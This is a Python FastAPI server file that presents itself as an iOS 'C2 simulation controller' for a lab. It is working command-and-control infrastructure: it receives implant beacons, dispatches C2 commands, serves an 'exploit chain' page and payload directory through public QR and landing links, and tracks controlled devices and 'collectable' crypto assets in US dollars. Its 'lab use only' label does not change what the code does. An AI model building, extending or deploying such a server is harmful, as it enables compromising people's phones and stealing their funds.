#!/usr/bin/env python3
"""
iOS Security Console — Backend C2 Simulation Controller
========================================================

Replaces and extends the original serve.py with a full FastAPI application
that provides:

  L1  POST /api/iptj, /api/ip-sync/sync   — Telemetry ingestion
  L2  GET  /api/payload/*                  — CDN & crypto pipeline
  L3  POST /api/c2/*                       — C2 command dispatch
  SSE GET  /api/events                     — Real-time event stream
  Dashboard alignment APIs                 — /api/dashboard/*

Static file serving is preserved so group.html, Stage*.js, payloads/
all continue to work exactly as before.

Usage:
    cd backend/
    pip install -r requirements.txt
    python c2_server.py [--port 9000] [--host 0.0.0.0]

    # Or from project root (replaces serve.py):
    python backend/c2_server.py --port 8080

The frontend dashboard connects to /api/events (SSE) and /api/dashboard/*
for live data.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
import time
from pathlib import Path

from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles

# ── Resolve paths ────────────────────────────────────────────────────────────

BACKEND_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = BACKEND_DIR.parent
PAYLOADS_DIR = PROJECT_ROOT / "payloads"


def _cors_origins() -> list[str]:
    raw = os.environ.get("CORS_ORIGINS", "*").strip()
    if raw == "*" or not raw:
        return ["*"]
    return [item.strip() for item in raw.split(",") if item.strip()]

# ── Initialize shared state ─────────────────────────────────────────────────

from modules.state import app_state

app_state.payload_root = str(PAYLOADS_DIR)

# ── FastAPI App ──────────────────────────────────────────────────────────────

app = FastAPI(
    title="iOS Security Console — C2 Simulation Controller",
    version="3.2.1",
    description="Backend service for the iOS SecOps research console.",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=_cors_origins(),
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Register module routers ──────────────────────────────────────────────────

from modules.telemetry import router as telemetry_router
from modules.payload_cdn import router as payload_router
from modules.c2_dispatcher import router as c2_router
from modules.demo_simulator import router as demo_router
from modules.tracking import router as tracking_router
from modules.export import router as export_router
from modules.notifications import router as notifications_router
from modules.qrcode_gen import router as qrcode_router
from modules.console_crud import router as console_router, load_global_control
from modules.daemon_hooks import router as daemon_router
from modules.auth import AuthMiddleware, ensure_default_admin, router as auth_router
from modules.captcha import router as captcha_router
from modules.proxy_ops import router as proxy_ops_router
from modules.audit import router as audit_router
from modules.device_assets import router as device_assets_router
from modules.collect_ops import router as collect_ops_router
from modules.database import init_db, get_device_stats, get_device_assets_dashboard, get_telemetry_domains, get_telemetry_timeline

init_db()
ensure_default_admin()

from modules.runtime_loader import load_runtime_state

load_runtime_state()
load_global_control()

app.include_router(telemetry_router)
app.include_router(payload_router)
app.include_router(c2_router)
app.include_router(demo_router)
app.include_router(tracking_router)
app.include_router(export_router)
app.include_router(notifications_router)
app.include_router(qrcode_router)
app.include_router(console_router)
app.include_router(daemon_router)
app.include_router(auth_router)
app.include_router(captcha_router)
app.include_router(proxy_ops_router)
app.include_router(audit_router)
app.include_router(device_assets_router)
app.include_router(collect_ops_router)

app.add_middleware(AuthMiddleware)


# ══════════════════════════════════════════════════════════════════════════════
# SSE — Server-Sent Events for real-time dashboard updates
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/api/events", summary="SSE real-time event stream")
async def sse_stream(request: Request):
    """
    Server-Sent Events endpoint.
    The frontend connects here and receives JSON events for:
      - telemetry    (new L1 beacon)
      - implant_register / implant_post
      - command_dispatch / command_ack
      - layer_update
      - heartbeat    (keepalive every 15s)
    """
    queue = app_state.subscribe_sse()

    async def event_generator():
        try:
            while True:
                if await request.is_disconnected():
                    break
                try:
                    event = await asyncio.wait_for(queue.get(), timeout=15.0)
                    event_type = event.get("type", "message")
                    data = json.dumps(event.get("data", {}), ensure_ascii=False)
                    yield f"event: {event_type}\ndata: {data}\n\n"
                except asyncio.TimeoutError:
                    yield f"event: heartbeat\ndata: {json.dumps({'ts': time.time()})}\n\n"
        finally:
            app_state.unsubscribe_sse(queue)

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


# ══════════════════════════════════════════════════════════════════════════════
# Dashboard Data Alignment APIs
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/api/dashboard/metrics", summary="Dashboard top metrics banner")
async def dashboard_metrics():
    """
    Returns data for the top Metrics Banner:
      - system health, L0-L3 status, today's blocks/captures, device counts
    Aligned with the frontend stat-* elements.
    """
    layers_out = {}
    for lid, layer in app_state.layers.items():
        layers_out[lid] = {
            "label": layer.label,
            "status": layer.status.value,
            "metrics": layer.metrics,
        }

    return {
        "code": 0,
        "data": {
            "system_health": app_state.system_health,
            "blocked_today": app_state.blocked_today,
            "captured_today": app_state.captured_today,
            "controlled_devices": len([
                s for s in app_state.implant_sessions.values() if s.is_alive
            ]),
            "authorized_devices": len(app_state.implant_sessions),
            "layers": layers_out,
            "uptime_seconds": int(time.time() - app_state.start_time),
        },
    }


@app.get("/api/dashboard/layers", summary="Dashboard four-layer architecture status")
async def dashboard_layers():
    """Returns detailed status for each of the four layers."""
    layers = []
    for lid in ["L0", "L1", "L2", "L3"]:
        layer = app_state.layers[lid]
        layers.append({
            "layer_id": lid,
            "label": layer.label,
            "status": layer.status.value,
            "metrics": layer.metrics,
        })
    return {"code": 0, "data": layers}


@app.get("/api/dashboard/daemon-hooks", summary="Dashboard daemon hook status matrix")
async def dashboard_daemon_hooks():
    """Returns the daemon hook matrix for the right-side dashboard card."""
    from modules.daemon_hooks import hook_entry_to_dict

    return {
        "code": 0,
        "data": [hook_entry_to_dict(d) for d in app_state.daemon_hooks],
    }


@app.get("/api/dashboard/domains", summary="Telemetry domain distribution")
async def dashboard_domains(limit: int = 12):
    domains = get_telemetry_domains(limit=limit)
    return {"code": 0, "data": domains}


@app.get("/api/dashboard/threat-timeline", summary="Telemetry threat timeline")
async def dashboard_threat_timeline(hours: int = 24):
    buckets = get_telemetry_timeline(hours=hours)
    max_count = max((b["count"] for b in buckets), default=1)
    return {
        "code": 0,
        "data": {
            "hours": hours,
            "buckets": buckets,
            "max_count": max_count,
        },
    }


@app.get("/api/dashboard/full", summary="Dashboard complete state snapshot")
async def dashboard_full():
    """
    Single-call endpoint returning ALL dashboard data.
    Frontend can call this on initial load to hydrate everything at once.
    """
    now = time.time()
    elapsed_h = max((now - app_state.start_time) / 3600, 0.01)

    layers_out = {}
    for lid, layer in app_state.layers.items():
        layers_out[lid] = {
            "label": layer.label,
            "status": layer.status.value,
            "metrics": layer.metrics,
        }

    recent_telemetry = list(app_state.telemetry_events)[-50:]
    live_sessions = sum(
        1 for s in app_state.implant_sessions.values()
        if now - s.last_heartbeat < 120
    )
    device_stats = get_device_stats()
    asset_board = get_device_assets_dashboard(limit=500)
    domains = get_telemetry_domains(limit=12)
    timeline = get_telemetry_timeline(hours=24)
    timeline_max = max((b["count"] for b in timeline), default=1)

    from modules.daemon_hooks import hook_entry_to_dict

    return {
        "code": 0,
        "data": {
            "metrics": {
                "system_health": app_state.system_health,
                "blocked_today": app_state.blocked_today,
                "captured_today": app_state.captured_today,
                "controlled_devices": device_stats["controlled"] or live_sessions,
                "authorized_devices": device_stats["authorized"],
                "collectable_devices": device_stats["collectable"],
                "total_assets_usd": asset_board["summary"]["total_usd"],
                "collectable_assets_usd": asset_board["summary"]["collectable_usd"],
                "uptime_seconds": int(now - app_state.start_time),
            },
            "assets": asset_board["summary"],
            "asset_chain_breakdown": asset_board["chain_breakdown"],
            "layers": layers_out,
            "daemon_hooks": [hook_entry_to_dict(d) for d in app_state.daemon_hooks],
            "domains": domains,
            "threat_timeline": {
                "hours": 24,
                "buckets": timeline,
                "max_count": timeline_max,
            },
            "global_control": app_state.global_control,
            "telemetry": {
                "total": app_state.telemetry_counter,
                "events_per_hour": int(app_state.telemetry_counter / elapsed_h),
                "recent": [
                    {
                        "id": e.id,
                        "timestamp": e.timestamp,
                        "channel_code": e.channel_code,
                        "device_version": e.device_version,
                        "domain": e.domain,
                        "ip": e.ip,
                        "event_type": e.event_type,
                    }
                    for e in recent_telemetry
                ],
            },
            "c2": {
                "total_sessions": len(app_state.implant_sessions),
                "live_sessions": live_sessions,
                "total_commands": len(app_state.command_history),
            },
        },
    }


# ══════════════════════════════════════════════════════════════════════════════
# Static File Serving (replaces serve.py)
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/", summary="Serve dashboard UI")
async def serve_index():
    index_path = PROJECT_ROOT / "index (1).html"
    if index_path.exists():
        return FileResponse(str(index_path), media_type="text/html")
    return HTMLResponse("<h1>iOS Security Console</h1><p>Dashboard HTML not found.</p>")


@app.get("/group.html", summary="Serve exploit chain entry point")
async def serve_group():
    fpath = PROJECT_ROOT / "group.html"
    if fpath.exists():
        return FileResponse(str(fpath), media_type="text/html")
    return HTMLResponse("group.html not found", status_code=404)


# Mount static files last so API routes take precedence
app.mount("/payloads", StaticFiles(directory=str(PAYLOADS_DIR)), name="payloads")
app.mount("/", StaticFiles(directory=str(PROJECT_ROOT)), name="static")


# ══════════════════════════════════════════════════════════════════════════════
# Entry Point
# ══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description="iOS SecOps C2 Simulation Controller")
    parser.add_argument("-p", "--port", type=int, default=9000)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument(
        "--base-url",
        default="",
        help="Public base URL for QR/landing links (or set PUBLIC_BASE_URL env)",
    )
    args = parser.parse_args()

    import os
    from modules.server_urls import configure_public_base_url, local_ip

    base_url = args.base_url or os.environ.get("PUBLIC_BASE_URL", "")
    public_url = configure_public_base_url(base_url, host=args.host, port=args.port)

    ip = local_ip()
    print("=" * 68)
    print("  iOS Security Console — C2 Simulation Controller")
    print("=" * 68)
    print(f"  Project Root : {PROJECT_ROOT}")
    print(f"  Payloads Dir : {PAYLOADS_DIR}")
    print(f"  Bind         : {args.host}:{args.port}")
    print(f"  Public URL   : {public_url}")
    print()
    print(f"  Dashboard    : http://127.0.0.1:{args.port}/")
    print(f"  Exploit Chain: {public_url}/group.html")
    print(f"  API Docs     : http://127.0.0.1:{args.port}/docs")
    print(f"  SSE Stream   : http://127.0.0.1:{args.port}/api/events")
    print("=" * 68)
    print("  Lab use only. Authorized devices and isolated networks.")
    print("  Press Ctrl+C to stop.")
    print()

    import uvicorn
    uvicorn.run(
        "c2_server:app",
        host=args.host,
        port=args.port,
        reload=False,
        log_level="info",
    )


if __name__ == "__main__":
    main()
